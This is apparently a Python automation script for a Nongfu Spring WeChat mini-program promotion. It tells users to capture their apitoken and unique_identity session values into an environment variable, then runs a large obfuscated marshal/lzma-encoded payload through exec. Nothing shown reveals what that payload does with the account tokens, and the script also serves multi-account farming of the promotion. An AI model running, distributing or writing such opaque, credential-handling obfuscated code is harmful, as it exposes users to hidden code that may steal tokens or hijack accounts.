'''
vx小程序 - 农夫山泉好水旺财龙年吉祥
抓包 gateway.jmhd8.com 下的 apitoken与unique_identity
变量填写: export nfsq='apitoken1#unique_identity1@apitoken2#unique_identity2'
支持多账号 请看注释中的变量填写
cron: 59 59 23 * * *
'''

import sys
vesion = sys.version.split(' ')[0]
if vesion.split('.')[1] == "10":
    print(f'你当前的python版本为 {vesion},即将运行脚本...')
else:
    print(f'你当前的python版本为 {vesion},运行所需脚本环境为 3.10.x, 即将退出运行脚本...')
    exit(1)
    
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(lzma.decompress(b'\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\xe0\x1a\xa1\x14\xc2]\x001\x802\xa0hC"m;\xa5S\x08\\\xd8\xf7\x17\xa0\x87@\x96\xe0\xf8\xe5/9\xf0\xa2\x10\xfd\xbeM\xf9\x12\xa5\xc3\xaf\xd6\x9b\xa7\x98\x82\xb06\xb0Z)h{X0\x88\xb2\xc0\xe6\xfb\x18&\xbd\xf6t\xdb\xbf\xe2\xa4\x16l\x19\xdaE\xa4\xd7\x0f\x08\xc5y\xad\xba\x1ad\xbe\xbe\xaa\x0b\x8c\x88X\xe7\xe5\xf1\xb6\xe7\x15\xbce\xea\x90\xc9\xd4\xd5\xec\xd6\xec\xf6bV8>\xf7\x88\xc9g_j\x16fu/z]\x1b\'\x9a\xb8\x96b\xf2\x9c\xe0#\x05\x08q\xc5\xff\x0bq\xdb\xbf\xed;\xfa\x8bd\xd5\xc3,\xed\xbe\xe0s?\xab\xe7 \xd8\x92\xe2\x19i^d\xad\xdb\x8eJ\x12\x8f \x040Dc\xcd\x13B\xc1"(\x80\xb3B\xd9x\xe4\xe5\x0b\xf8n\xbb\xd3!`\n\x17P\xf0%\xfd\xc8\xa3\xd72\x0c\xfc\xbe\xbe\xf3O\x89\xcc\xbcL\xd14X\x04\x07\x82W\x85\xcf\x0fi\x1a\xa7Gp\xd7@9\xa5\'\xb9fk\x0cimfqTK\\\xe7\x9fy\xc4\x9e`2\x173\xf4\xb7\xac\xfa\x93\xde_\xa9\n\x05\xc4e\xd5,\xc4X\x18\x8f\x1a\xbc1l\xc6\xdb\xbe\xd8\'\x10\xd6\xc1~p\xc6?\xceUo\xccU\xb8p\xed^\xf4:ti4S\x01=\x0b\xb0\xe5\x13\xf5\xbb\xc7bH\xeax\xe4*\xe3\t\x04Iw:\xcb\x8b\x93\xa6\x0bW\xa0:\xab\xa0vb|)\x90\xb4\x17\x88"\x08\x92o\xdc\x83OM\xd7\xc9:\xe7\xca\x8el\x1e\xd7\x8f\xab\xb9E\xa1"v\x17_\xc2{\x10\x1cv\xf0\x1b\xbb\xe3%\x91yA\x1f&G\x084\x83\x911\xa48\x04\xb7\x95+\x9a\xcb\xc7\xad\xc1\xf7\xd9\x8dT\x8a\xc5b\xe1M:d\xa1\x8bT\xb7\x93\xbax\xce\xbbg\xfa\xec*BR\xef\x10#w\xef\x1c\xc3\xe7G\xf2V\x18\xf6)\xa0\x90 \x0f\xfaxr\xf5f\x17\xb8U\x00\xb6O\xdd\xe9\x1e5:\xe7\xd0hp\xaai\x9fH\xd7IrJ\xbe8c\xa9\xb8b\xe7\xff\xfb\xb0~\xa9\xf9i\xb5 |\r.n\x18w\x86\x1bA1Q\x9a\x94\x02\xc7\x089\xaa\x9cn\x8b\x8a\xd5\x82\x08m#c\x8d\xael\xff"c\xb4\t\x98r\xc7\xe4\xb8\x82\x0c\x88\x89\x11\x8d>\x1b\x84F\n\x9b\xfcs\xeb\x18/\x15\x1c\xcf\xd2l\xd9\t\xca=\xc5\xbe\xfb\x16\xb9\xda=-\xdd\xbe\x9e\xe2S\xa2\xaf#cI\xe5\xaf{k(\xbevM\x87\xd4\xe4G\xb2\xec_\xc1\x819\xcb>\xb7\\qh\xcf]mh\x82\xe6\xf3\x1a\x08\xb4]\x86\x9bj\xca\x1b\x11\x02\xe7k\x92/\xb3\xb7I\xbaaW\xa76\xacT\xca=\t\xa2\x83\xd1@A\xa4a\xaa\xf2\x8a\xcf\xf7M^\xa8\xf4\xf7\xa9\x1e\x1f\xbc1\x94\xccg\x1c\xd3\x96\x93\xed\x85u\x18\x00\xef\xd5\xddKX8\xd0\xa8\x87\x03I\x14_\x1d\x9f|\xe6\x84\xd1\xa8\xdc\x85;\xff\xc3\xda\xc2\x14G\x85RE\x9e\x97/\xc2\xffm\xb4\x0b\xbaf\xa3\x03\xf14F=\x8e\xc9w\x9c\x0c\xa6\x9a\x88+r\xb0\x1as\xa0\x96\x19\x0eQ\xbf5F\x02\xd6\xc9\xb6\xeb\x18\xe4\xa4\xa1fK\n\x13\x8bPy-v\xd4\x01\x15Hx\xcfW\xeaE\xd6{`\xd2y\xd7]]Z\xa0p\xf6\xd3\xf8\xb0\xfdE<u\xb8\x98\xc0\xa7i\xee\xf6\xd5\xf4Z\x81\x91to\x7f\x00\x80\xd0\x89?9<(\xd8\xbd\x04\xa7K\xb6\to\x8f\x90\xa7\x07w9\xa1\x89\xeaP\x9d\xe7\xe5\xc2y[\x89V\x99w\xa70E:\x87\x0e\xbfp\xc8\xa1\x86\xf9\x92\xa8@a6S\x97V\xc9\x0f\x0893\x88\xfd\x95\xa0\xf1\x9f:\xc4e2 \x82i\x08\x99\xd3p\x9bN\xb0\x92T\xf8GP\xef\xc4L\x14\x03\xf9\x80\xb2Hf-n\xbe&\xfa\xe7t\x88\xb0\xc0\x02\xc2g\x0c#.Vo\xe2LZ\xda\x19\xa9\xe2\x84\xae\x94\xb2\x87$\xb6f&O\xaa/\x7f\xe8\xff\x19\x08v\x8e\xc6\xaa\x95H\xc3E\xa0T9\x00\x86\x9eS\x05R`\xbc\xf4\xaa\xbe\x8e\xba\xf3ib\x15v[U\xaf\x1d\xb3L\xc4\x84\x1cs_z\xdf\xa2\xfcq\xac\x87\xcf\xba0\xe4\'9\xd5\x8f9\xd8\x19|S\xbd\xfa\x8f\x04\x0cjf\x87\xc9)\xab\x8c\xce\x8d\x1c\xab\xcc\xe4\xe4x\xc1\xec\x01\x11~\xee\xd3\xf7T,\x18u\x8b\x8b\x1e$\xd2\xaf9\xec\xc1\x9b\x16F\x96\xee\x89_\xe1\xaa\xe1!\\k\xf3\xb1\xec/\xc7\x08&\xd6\xff\x17-\xb6\x14; \xef\x98\x9a1\x05\xbf\xaaq\xafh\x85I`\x84!\xd1\xb4\xf2:\xa1\xca\xd9\x89\xd7\x05\t^\xc9~3\xd41\x08\x87\xbb\x13\xa7\xe0\x06\x96E\x17cpwA6\xdf\xfd{o\x1a\xf4\xd4\x86\xb0q\xe9d1\xf1h\x19X\xcb\x8c\xa1\xb8<\xa2\x88\x1e\x94I>\xc0O\x83\xc8\x7f\x9e\xcb\xb1\x82\xf0\x03\xd6\x0c\xfd\xbc\x92\xd6YZ\xf2\xe1\x13\xea4)]\x89\x8d\xaafj4Y\xdd\xf5\x16\x892\r\x9c\xd9\x10|\x82Q\xdd\x9d\xb5\xd9\xd3Q\xa8\xaf\xf2\xa5\xc5\x92\x0e\xe9\xb27\xb3\xdbD\x9a^\xa4\xfd\x9av2&\x93\xfc\x9b\x10\xf6V\x11\xb2\xf2j\x15\xc9\x8e\xb7o\x8c\xb1fT\x93\xec\x08B\xbcL\x8bt8e\x86\x19\xbf\\\x9aQ \x87t\xbe\x15\xb9=\xd1\x82\xc3;\xa6\xa3\x16\x14\x9al\xbbB\x88\xd3\x15R{\nb\xf4\xce\xbe\xa7\xdc\x1a#K\tlw;\xd5\xc6\xbd\xf8\x1b\xb1\xdc\xa0y6\x9e\xf7\x06\x7f]\xear\xdfd2\x10F\x00?\xb1\xb24\x1ac\x0c\x1e\xe3/L\xc0\xc4\xe9\x90^\xd53\xca\x88\xc6\x1fD\xc1\xc6\xbc\xa3\xb3,-g\x80+\xcd\x89\xd6\x99\x0f#\xfa\x9b\xcf\x001\xf3bBR\xd8\x9b\xf6\xb1fa\x9f\xb9\x1d\xba\xc9\x8bv\x85\'\xafQJ,/\x12\xb9\x90W\x98\xcf\xdf|\xe0J\xd7\xc1A\xf4\xa2B\x96h\xc0\x90\xae#o\x90\x03L\x80!\x92\xe2\x81\xb9\xdc.\xee>20\x0e\x97\x98\xb0\xc8\xa5\x02A\x03\xf0\x85\xbe5\xb2\xdb\x13\x1e\xfe \x930\xfaQ\xefo\xb0\xf0\xc8\xb2\xd9\xe7\r\x0c\x1a\xf9c\x8e,0\xc0*\x80E\xdc\x13j\x85.\x11,0\xb0\xcc\xdb\x1b\x93\xd7[I>R}\xf9\x84\xc3\xbfa\xec8K\x1f\x12\x99\xcd\x88\xde\xe9\x92\xca1\x90\x8b\x07\x00\x98\xc8{\x82F\x95\x88i\xf5\xd2=%\x12\xbc\xef\xe3\xb1\x03-hnBbE\xcc\x15\xa9\x14\x13\xd9\x87\xc9\xd0nj\xa7S\x99l.\xcb\xb6\x06J\xd6j\xfbs\x03\xa0\xd5\xc1\x1d\x83\xc6\x92\x8b\xc9V\xae[\x92G\x8b4\xf7\xf0i\xf7\x86\xbf\xec\x0b*q\x13\x9b\x84\xb0\xcb\x92M\xbbv\xdeS\xd5M\'\nv\x185\xc0\xaa3\xc3Kp@|\xe5\xd5.\xbb?\xde\xbaR\xce\xf6/\xfe/?\xde\xbdH\xf3\xf1\x1eJ7\x17\xe5\xdb\xde\x12\xefV8\xa3\xee\xb65\xe9\xcc\xff\x06rw\xf8\xbb\xa9 \xab7\xb7\x06\xac\xc5\x9cU,\xab\xe0=\xbc\xea\xe1\'H\xb3\xfb\x8a\x96\xa5\xf1\xadOj\x1eO\xfeH>_a(\x9d\x01\xeb\xf5\x1e(oP\xcf[\x81v+\xeb<jl\xc9\xb0\x873\xdeg\xf7:!\xbe\xb0\x0b\xc1+\x81\x18\x9c\xcd5\x96\xfar\x8b\x0b\x90\xde(4[\xaeC\xbdeLi\xc9\xddw\x13\xa8R\xc6|\xdf5\x18\xe7\xb9\xc5\x85\x91yj#\xcb6\x05/\xb1\x83p\xd5\nQ\x08\xba\x8f\x7f\x1d\x90\xb6"\xe5Q\x8fZ]\xf5\x07+cd\x98s\xf1Y^\xb0\x90\xcd\xe4\xe2\x7f\xd9\xc2\xda=\x81\x18(I\xb69S\xb0g\xe4\xaa\xa6Tc\xb7\xf6d\x93\xa2\xb0\x91\xe3qb6<\x8b\x94\xca\x03\xf2\x8c\xc6\x92\xc1b\xdf\xd5\xe1!\xd0\xf91\xd4\x0c\xa5bi\xfe\x18\xf2\xa5\xa7\x83\xbd\xb45i\x0fK\xe6L\t$\xa1\xce.b\xd4\xe0\xa1;\xc9\x90\xa5\x835\x84h:\xeabm\xce\x1b\xeb\xffA\xa1\xd9X$t\xb55->\x93\x08\x9aI\xfa\x9a\xc1+}\xd9\xc2\xc5\xaf\xe3\x02`\xd6\x9d:G\xb1\x0c\r]]\xcb/\xd6\xa2S\xcc\x8b\xeeIE{/\xd92\xb3\xfc\xaeAW\x82?\xdd\xd7\x9f\xc6#\xc6\xcd\x0c\xe6\xe5"+.6A)4\x94\x0e\xcb\xdaJ\xa8\xa2\xe0v\\\x84D\xa0v!\x98\x08yQ\x8c\xdb\n\x02\n\xa5Z\xfe\xc9\xe2r\xf5\x0b3b\x0ct\x93IJdl\xd8\xcfD\xb5\x8c\xdeb\xce\xb5O\xcdQ\xb6\xcb-zUh)\xcd\xa9\x84i\x1a\xcc\xd5g\x93\xa2\xe9\x88 \nq\x14HYK\xf9\x0bX\x8c\xdc\xb6\x97\xeb\x01\xc1/\xb3\x84\xa2\xc4\xbc\x84\x04\x02\x1f\xc3\xceuHB\x9fX\\\x94\xb0\x1e\xb8\x84\xe0O\xd5\xe1+]/\x9a\'\xdd\x98\x98J\xd6\x8bC\x83>\xddLU\x15\x90\xae$\xfd\x0c\xa8\x17@!\xf3\\\x93Xf\xe9d\x04\xcd(.N\xd8\xb7\x8c\x0f#\xd8\x05\x8f\xc0L\xcce\xbb-5\x9a$E\xa4m\xe8\xcc\x06\xdb\x1d\xb4\xfa\x83pJ\xd5M\x84\xadfuY\xfeB\xc7\xba\xa5\xd8\x08\xacp\xe0\xa4\x05\x83S\xe3\xc2\xa4\x01\xdd\xb8\xbf\xdb\xb1\xc8\xf2\xc89\xfe\xa4\xbc\n\xd2\xa6\\\x83\xf3<\xf2\xd5+\xba\xcc\xfew{\x952\x0cU\x01\x91;\xff\xf1\xbfe\xd4\x10!\xaci\xc8\xdb\xf9\xdb\xe4\xd4\xf2t#;Km\xad=E\xd3\xa1R-\xa1\xfeV\xf15V\x13c\x16\'U`U\xa7\xff\xe7$*6_@301\x16i\xfc"\xafR\xd3\x18n\x9bo/\xa4a.v1\xa4.\xf2\xdd\xd8\x0b\x11\x89;\x14x\xdf\xdd\x9a-6P\x90\xb5\xb2\xe3%\xad\xef\xb55,\x8e]\xfc\xb9|\x94\xbe\xa9\xab\xc9\x81l\x04\x00!$u\xc0\x0f\xee\x8d9\xf4\xd5d\xd7\x0cU\x03\xafBW\xfe\x1c\x963\xeb\xe3\x11\x1eZq\x90\xd1%k\x8b[\xc6\x17p\x88\xfd\xaa\xa2\xe7\x89X\xf9\xd2\x85l\x05\x19\x9c<\x17tN|\xfe\x8e\xe0\x1f7Y\xb9\x8b*\xc7\x19\xaa\x12h#\xd6\x85\xab7\x82\xd0\x17\x16\x92\xdc\xd6>\xc6\xb8\xab&HR`\\\xe7(:m\xe5\xe4\xec\xcb\xa0\x10\xdb\xb3\xaeB\xba\x9dZ\xab\x0cPWC>&\x03\x15\xdd\x0bV\xb6\x85Q*\x96\xa9\xf1\xfe\xf3E\x87+\r\xbe\'\x10\xc2z\xef\x99\xb6[\x16\xe17\x83\xfb!\xd5M\x85\xb8\xc0\x16\xbb\x06\xbeg4\x83\xbdn\x99\x04\x8d\xb6)\x86\xb2\x88#\x98g`\xb0W\x99J\x08\x14\xdf9D\xd9bT\xbd\x18\xc2\xdcw\xc8\x95\xca\xf4\xdb\x8bq\xffn\x0c\xaa6\xb2s\xce\xbc\x9e\x96\x13\x03\xf7o\x0e\xa5u\xdb\xf2X\x83\x8c\xf3T\x06c]\xa0\x84ad\xe4\xc2/sf}\xf8\xba\xf1\xa9;=M\xe6\x12Q:C\x18\xbb:\xba2,\xfa\xba-\xb1\xa52\xa0*\xed\xa9?K \xd1\\\xbeo\xd9\xc5\xc7R\xfe\xd9<\xb4\xbb^\x9e;\xb4u\x14\xecGtt\xf67\xa2\x8dtx\x1f\xb5\x01\xa6\x1co\x8c2\x99Z\xa8\x08y\xac\x9f4\x06\xae&-\xd3\xb0\xae\xd1:\xbeP2\xd8\xff\xd3\xd2\xb6=\xd1\xb7u3 \xea\n\xb1\x05\x1e\xaf\x84\xa3\x14~qc\x1c4\xbeQ\xec\xe4l\xa01\xee\xc4\xf0\xed\x059[!\x86[\x07\x08\xf1g\xdcG\xcdm\x0b\xbb\x97a/\x1a4\xcdbj\x9f|n\x82U\xee\xc76\x98\x80%;\x85\x87\x04\xf5\xb0\x1f\x11\x80\'\x99\x0f\xf7\xe4\xe8\x0ew24\xfa\xb7/U\xe1W\x8bi\xe6\xb8\xec|+\xb0\xb0\xebX$\x9a\x01.M\xf6\xc9\xc3\xa4\x9ah\xaf\xdf\xb6\xe3"s/\xd5\xa4\xca\x8a\\\x9d2Pb\x1b\x93\xdc!\xd2o(\xdfT\x94\xc6\x91\xd8GV\xcb\x88\xb9\xb9\xc5\xb7\x98\xae\x9e\x01g\xf6e\x82z\x05_\x04f\xa5\xfe\xd0\xfc?\xe4^\xcd\x8f\xc0\xc7C\x11\xeb\x08\x90\xf2X!\xc8/\xa2&\x00\xf0\x8d\xce\x84\xc3\xd3\xeeW<\xf8\xe0\xea\xc3m\xa0\xad\x1c\x0f\xdf\xfc\xf7\x11\x0e3\x7f\xc4n\xceV\xfb\x96\xc9\x1b\xbak\xda{\r\x8f4x\xe6\xf1\x12\xd9\x8d]\xbc~\x82\n\x1a\xcb\x99\xf2\xdb\x9c\xc1g\xc2o\xb0\xa8\x12C\x17\xf2JI\x17\xb2\xee\xc82\xc08\x0b\x92\xfaat\xfa\xdc\xa7\xd6nX\xf2\x98\xdc\xbc\xaaN(\\$\x1c\xbb`\x8c\xf8\x87!\x0e,\xfe\xf7\xf0\x8e\xfb\x7fGv\x88\xa5"\xda&\xdf\x83\xdcV\xa0\x86\x91\x91\x9e\x8f\x0f\x97\x86\x9a\xe5\xf8\xde\x1f\xd4\x06\xde\x89/\xbcMW\xc2\xf5\x8a\xb9d\xef\x17r\nH\xbdT\xa2\xb9\xb1\xb0\x98\x13Z\xa3uE\xb98\xb0LY\xe4\xe9\xdf\xe2\xdd\xe9\xdfw\xac\xfe\x81\x98\x95u\xdeN\\\x88\xa4\x80\x87\x12\xdc\xfbZ\xf9rY$\t{\xe7\x1a7\xe3\x9d\x9aurQo\x00al0\x97\x99\xe0\xfe\x86\xb6G\xb7\xd9\xc4}\x9d\xdd>\x18C a\xae\x1em\xafD1 IcD\x16\xf1\xd3u\x80wg[\xfc2\x1a\xb0\x01\xf4\xe7\n\xa6\xe5\xd0\x13\xed\xf5\x9b\x8b\x9d\x1a\xf0\xf2\xf5\xca\xd5)\x83\xf8\xa5\x8e1\xb9.u\x04\\\x1e\xf2\x94\x15\x84\xbb\x19F\xbd\xfc\xb6P\xe3$r\xbd\x8e\x034X\t\x89\xde|Y\xbe\xb9M\t\xbb\xa4\xde\xfah\x9e\xec\x1f\xaak\x89\x8a+74\x0b\x1eg\xcb\x1aY\xbc\xee$\xd0\xc7\xeb\xe8:P\xe6"\xc3\xfc#\xd5\xb9\xf3 $\x88\xda\xb8\x0b\x94\xec/ \xf7\x13 \xc8\x81\xd5E\xb2\xa2p\xb5\x1d\\``\x00H\x10\xcd\xda<\xdd\x07\x83\x8f\x80\x12:\xad6\xb3\xb6\xed\xb8np\xa3\xe1\r\x03\x1e\xed\xa0J\x99k@_\xbc\xa5\xdaPQ*FRD7K[\xe2\xc3\x06L=\xa7`\x88\xe7\xc0\xb5|\xc2\xeb\xf5\x98\x13\xb4\xbe\x87RR\xe1#\x14\x8ea>x\xd8\xfc\xc6"\x0e\xa8\xd1\xa3\x97\xe5\x1d\xd1z%M&\xb0\xa70\x97>I\x97g\x1e\x0bo|i\xd1\xe8\x81\x9c\x0bF\xbe\xf4z\x97\xcbA~.!\xb6Fe,\xdd\xcc\x91\x8a\x18\xecVc\xfe!\xbd\x01\x88\x91\xde\xdd\x9c\xadm\rS\xc9\xee\x9b\xfa\xd1\xdc\xf7\xf6&\xb4\xaf+\xb2\xb0\x03?\x92d\xd0\xd7d\x13vS\xa4\xb7\xba\x92q\xec\xa4\x8c#\x99K\xc5A|\xbf\xe4O\xcb8\x83\xbaf\x15\xe1\x1d\xbc\xb8\xdbp\x0c\xa1n(SI\xf4]\xcd\x1cn\xc1(\xff\x918\x17ft@I\xd1c\x93aQ\x04\x7f/\xc6\xb5\xc1\x83X\xae\xf3\x8d;\x9d\x16<\xba\x15\'|(\\\x84\xec\xd5\x04\x88@"Q\x8b\xaf\x11\x82$\xf7\xf1\xfboPA\xbag\x8c=\x06\xa9\xd1\x03tUy\xb0z\xff\xba\xc5\x8f\x89/"\xb6?\x1c\xbd\x89\x96\xa9z\xea\x82\xa1\xde\xeb\taS\xffRA\xf6=[\x7f\x06\x16J\xfd\xd0\x8d\xe6~^@\t\x93[D\x14Mp\x95kN2G@%\xff\xe7D\xc4\xd0\n\x05-x]Y\x9d9\xf0\xf5\xd5\xdf~C\xb6d:\xc9\x8f\xc6\x08]Z\xe6\x88\x0c\xdcw\x12/\xd3>x\xf8\xd8\xf3\xb9e\x16\x9aij\x9d\xb6\xf0<?\x9c\xb4c\xa0\xb8\xec~\x19ZU\xe5\xa04\xbaH\xf7\x1d\x80\xa7J\xac\x00\r\x07\xbb\x0e\xe6#\xbbd\x0e\xa5\xa3\x93s\xd7F\x98\xf3Hy\x99\xd5Ej8E\xeb\xde\x15\xdbS{\xb9KQ|K\xfd\xb0\x97\xa6$\x81>\x96\xc2E@\x1b\xddF/\x96\xd2\xea\xeds?t\n\xd6\xc1XV\xb6\xc5\xf0\xc2\xa6\x97\xb6\xd9\xfd\x03\x05|\x1d^\xb0\xe9\xf1T\xd8\xcc\xff\x9b\x8a\xb9\x1e0\xf5\x01S\x1f<\x8eH,\xe4\xed\xfc\\\xc1\xe9\x86\xeb\xf0p>\x01\xcc9(\x9e\xa3Q\t\x17&\x1d|\xc8\xcf:\x82\xcbi\xa4\x92\xbf\'\x95\x07H\x833\xddYT\xff\xb9\xbco\xe7\x86\xd6\xb2D\x8c\xa5\xcew\xef<\x83\x12\xe2{I\x02a\x1d\x97\x95>ao\x91\xea\x0b\x15I\xb7\xd1T\xd2\xb6\xf2&m\x89\x0c\xd8\xcc\xa6\t\x06\xa2|\xc5*W\x10[2\xec\xe6Q\xe7\xb0K\xa5T\x8f\xd3\xa8\xde\xb0\x9b{\x0bU\xa0\xafL\x966\x83\xee\xe9\xff\xfaf\r?c\xd2\xa2\xb8\xc3\xa7\x16f=\x03\xf3\xb2\x8c\xd5\x90\xc4\x9e\x90\xa3BNEAt\x85\xa4\xb4\x97\r\xd2\xe2\xaa\xcaF0\xab\t\x99\xa8\xf98>\xd99\xbc\xa2\xc3}\x17z\x08p\x95Wu\xcf\xe2\xd1\xad\x11u\x81V\xf9\xc8\xeb\x8cf*\xefC\x13,Z:=\xd5\x8ax\x83\x80)\xba\x16\x05\xf1\xa0\xf5MW\xbc\x05\xbfD3\x13\xff\x13\x9d\xc4\xe357\x94\x12\x17T;#S\xd7h\xe4\xc8\x9ca\x8f%\xea<\xd0\x94[\xf9\xef\xf1\x83]\xef<MPD\xe7\xc2\xc2\x1f\xf1\x84\xfe\x08\x15\xc3y.\x1c\xda\x1b\xf0PO\x9a\xbcz>\xbfW\x05+\x01\xed\xa6\xb3\x87c\xeeq&\xc6\x1b\xf6\x90\xa0[\xc16hL\xe7\x984Z\xd4\xb8\xba\'\x88\xbe\xae\x96{\xdfi@,}\x88\xf2\'\xbf\x16I\xbe\x95)u\xb7\x83\xc3\xdfa\xbd|\x84y\x11Q\xab\xbbh\xab\xe6\xa3\xb2Vas\xf9\x08\xd3\x14/\xe1\xe0=\xfbD\x07\x81)\xbd\xe1\x1a>\xda\x00lj\x8d\\\x1e\xb5\xe3c\xe2)\xedI\xd1\x88\x9aQ\xfc\xb88_\xd0\x8c\xcfoa\xc4EG\x1e9\xd4+]Z\x18\x8c\xdb\x1f\xe7\xdb\x85\xf7o\xa3\x8c\x19\xa4\x05\xa4\xa1\xb8Bp0\xba\x9b\xde\'\x8f\xca\'\xb1\x07\xc2\xc1DG=\xd2\xae\xbb\xd5\xf6\x1f~\xed\xe0\x91Y\xa1 .\to#\xcfl\x0bb\xbd\xd1\xd6\x92\x80\x88\xf0\x8c\xce\xe7\xde\x90\x18\xc2\x04\x0e\x1f\x9a\xc8U\x96\xe8\ne\xdc\x17@\xdd\xdfv\x18\xbd\'j\x9e-,\x9d\xf8\xcf\x11f\xa2P<\x19\x94WD\xa1\xca\xa0hq)\xd3\xbd\xcb\xfb\x80<=\xbb\xb5=\\\x1d\xec\xa7/\xcdd@Z\xff\xa3%.\x0e\xfd\xeb\xfd6 _WO\xae\x9c\xbas\x16X\x83\xc7\xd1\x1c\xa8\xcaC\x95\xdehs\x93P\x92\xd3\x03\xaa\x91\\\xb74\xa5\xa8\x07\x073\x1a\x06F\xeb\xf5wLn30\x0f\xe4c\x00\x0fK\xb1\xfb&\xcb\x18\x93:k\x9d\xaf\xed\xf1\xfa\xbaM\xe9\xb4\x11\xed3\x95\xd2\xb5m\xb9\xf5\x01\xbf\xa4\x05\x08\xd3\xdbe\x13\x9b\xfasr\xc8\xce1\xedt\xa6\x04Al\x90\xa8\xd8\xe8\xdck\xd8*\\\xafi\xa4y:\x8d\xffT\x12\x97\x89l\\v\xf0\x84\x81<\xf6\xc9Z%\xb8\xac\xb0*\xc5\xe3S\xd2r\xee4\x92\x1aR\xc3\t-8\xf6\xbc6\nN\x04s\xc8\x17|}~\xa4N]~\x93\xf0\x01eH\x9d/\x0c\xf0\x00\x07\x07\xcb\xe9\r;\ntK\xa3XW2\xb0\xe6\x95\xc7\xde\x10\xe3\xb5\xbc\x8bd\xd5s\\}#*\xb6@V\x83D\x049\xc0\x9b\xf8;3\xc4r{_\x96K\xefw\xd5\t\xe7b\rs\x11\xf01b\xb1X\xb8A\xec\x11\xba\x80\x04\xff$\x03\xfa\x02B\x9f\xba\x91\\7&\x905\x81\x9av\x86\xd9\x01\xca\n\x06\x96\xfb28U\x19\xf4;5\xdc8\xe7\x9dOEFE\xbf\xc6\xc8m\xfb8\x9dh2\x98t\xbc\xbeYn\xf2\x02\xcb\xa4\x1e\x0c\x10\xb0\xe9K\xc2\x87\xe2\xaf\xbf\xc7\xc7\xe2\xa8(|\xc6O\xf9\x01S\x9cxV\xfc\x05\xd0\x81i\x03\xa0\xe4C\xb2P\xe8\x84\r\xe3y\'H\x84\xe1\x86\xfb\xbf"r\xec\xe2\\\xa3\x12P*\xd8Fff\x8b\xc2\x1a\xc4WL;b\x94u\xd0\xb6n\xb2\xe8\x89\x13Uc\x15\xd9\x83\x17\r\x1f\xc9\xae^(\xc0\xc7\x12z\x81*\x04HW\x08\x1b\xda{\xf4k=me\x9bZxA\x0c\x1d\xd1j\xd5t\x18o\xbf\x0f\xab;A\xa6\xce$\xa4w\x97\xf9\xd0\xf2\xe4ho6\x1dG\xd5{\x18\x976^\xad\xa7!\x17\x8d\xfaH!5(\xa6!s\xcf\x07\x8b\xe5\x1e\xb1!\xeb5CU"M\xcd:\xabk\xc9\x14\x8a\x88\xc3\xd1\xb4\xfa\x10X0\x17\x94v\x1b\x14F\xae\xf1y\xec\xb2F\xc1m\xaaF\x9d\x01\xf1\x8fK@\x8b\x03\xd4\xf5\x1cc\x1c\xb6\x1e\x0c\x92.\x8e`|\x97&\xe5E\xb3\xab3\xf7\xbb\xe7\xfbh\xba\xa1\x8c\xc1y\x01AEo\xe4n\'v\xbb\x89T\xed\x8ao\x16O\xf6\xa1\xa5LJ\xd97\xd8}\x92l0\x1cI\x9e\x03]\xb7A\xb1\x13\x8fq\x90\xc1\x8b\xec\xfe\xc3#\xe7\x92\x90\'\xc6\xdai\x1c\x9d]\xa0b\xad\x80+@l1\x80\x87p\xd3\xc0\xccM\xe2\xbe\x10$V\t\xa9\x17B]OQ\xed)\x8a\x801W\x9b\xe5\x00@3\x82\x85X\xc1\xd1\xfa\x8d\x85\x8d\x85o\x8f\xd92\x00D%\\\xda\xb7]\xcd\x1dS\xba\x8f\xdd\x87\xb5\xebC\xfeX\xddY\xcdL\xbb\xd3.#\x05\xa1\xb66G0\'\x00\x8f\xd27\x01\x92|\x08\xd8\x00\x8b0\xf0\x9f\xed\xe4E\x04\xfd\xc5\xca\x94\x8c\x11\r\xa4\xc9Sx\x02\xcbk\x11\x89LX`\rO\x1f\x8f\x16\xfb\xe4u/X\x9doU\xa9\x94\xd2\xda\x8b\x98,=\x11\xf2\xef&\xf3\xc59\xee\xdb\xb0N\x01T\xba\xae-h:\x1e\x94t\x87\x01\x84k\x19\x9ei\x0e\x80C\xbeVd&\xd8j{\xe5iR\x08\xeb\x98B\x0e\x81.\xe7\x96B6\xa0\xa20y\xe4\xb9px\x8b\x07S.H\xb8l\x1cbe~\x17\xa1\x81\xac0\xebs\xf8\xf1\xf1\xe6-Dm\nx0r\x1c\x9d\xbe\x8b\xc7\xb7\xd5\x1f\xbd\xff\x02K\x91\x89\xe6\xec$\xaa\xeb\x11\xdcu\xf4\xb0\xb2k\xe0\xb9\xb1>\xba\nY\x14\xe0\n\x83\xf9\x1c1\xda7\x0f\x19b-\x0c\xb7\x80f\xc3\xa2\x92\x7f\xbf\x1b\x8b\'\x1f\xa9\xfb\xbe\xc0\x8ay\xfa\xdbK\x84\x05\x06\x00\x1f@W\xc1h\xec \x1a\x18\xf4\xf5.g\xa1@\\\xa2\x1a[\x034\xaa\x9e\xe0\xef\xf8\xcdv\x94a\xe6\xb2&\xcd \x99(\x00\x19\x00x\x06\xb4\x12\xe2\x01d"\xec\xeb\xdc\xaf\xe9\xb71\xa2\x00\x0e\x8c\x0b]\xe1\x8e\xcb\x03\nQC0j\xeeG\xb3\xef\x9f\xc9e\xbd\xc5\xcb\tv{gja\xec\xf1\xb3\n\xec\xf2 \xcb\x97\'\x89h\x92\xbb\x14\rt\x07\xba\x91\xc4/\xc2u\x1eELOH\x11A.\x9f\xf0\xae\xbbT\xe0\xd3\xdc\xdd\t\xac\xc7%\xd51\xf3\xafi\x0c/\x0ey\xb2r\x08C\xf5\x0fs\xa6\xd4\tX3\x87Q\x9eP\x1e\xc4\x90\x81y\x96\rH\x01\xde\xce\x00\x00\x00\x00\x00\xf0\xec\xfab\x14\xde\x1fI\x00\x01\xde)\xa25\x00\x00\x02\x12r\xe2\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ')))
except KeyboardInterrupt:
	exit()